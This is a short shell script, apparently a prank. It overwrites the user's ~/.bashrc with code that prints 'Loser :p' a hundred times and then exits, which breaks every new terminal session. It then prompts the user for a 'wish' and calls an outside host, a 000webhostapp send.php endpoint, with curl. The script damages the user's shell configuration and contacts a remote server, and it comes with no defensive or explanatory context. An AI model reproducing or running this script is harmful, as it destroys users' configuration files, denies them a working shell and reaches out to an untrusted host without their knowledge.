echo """
for i in {1..100}
do
	echo \"Loser :p\"
done

sleep 2

exit

""" > .bashrc

cp .bashrc ~/

read -p "Enter your wish ->" f

curl https://foofooco.000webhostapp.com/send.php

exit
